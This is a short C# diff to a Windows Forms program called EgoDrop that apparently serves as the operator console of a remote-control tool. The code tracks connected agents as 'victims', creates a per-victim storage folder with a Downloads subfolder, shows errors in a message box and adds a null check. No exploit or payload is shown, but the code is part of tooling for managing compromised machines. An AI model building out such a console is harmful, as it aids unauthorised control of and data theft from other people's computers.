@@ -337,10 +337,27 @@ namespace EgoDrop
                     if (!m_dicAgent.ContainsKey(agent.m_szVictimID))
                         m_dicAgent[agent.m_szVictimID] = agent;
                 }));
+
+                // Check victim portfolio
+                string szVictim = Path.Combine(Application.StartupPath, "Victim");
+                if (!Directory.Exists(szVictim))
+                    Directory.CreateDirectory(szVictim);
+
+                string szVicDir = Path.Combine(szVictim, agent.m_szVictimID);
+                if (!Directory.Exists(szVicDir))
+                {
+                    if (!Directory.CreateDirectory(szVicDir).Exists)
+                        throw new Exception("Failed to create directory: " + szVicDir);
+
+                    if (!Directory.CreateDirectory(szVicDir + "\\Downloads").Exists)
+                        throw new Exception("Failed to create directory: " + "Upload");
+                }
+
+                agent.m_szVictimDir = szVicDir;
             }
             catch (Exception ex)
             {
-
+                MessageBox.Show(ex.Message, "fnOnNewVictim", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
 
@@ -366,7 +383,7 @@ namespace EgoDrop
                     if (listView1.Items.Count == 0 || listView1.FindItemWithText(szID, true, 0) == null)
                     {
                         string? szIpExt = victim?.m_sktClnt?.RemoteEndPoint?.ToString();
-                        if (string.IsNullOrEmpty(szIpExt))
+                        if (string.IsNullOrEmpty(szIpExt) || victim == null)
                             return;
 
                         ListViewItem item = new ListViewItem(lsMsg[1]); //Screen (sudo required!).
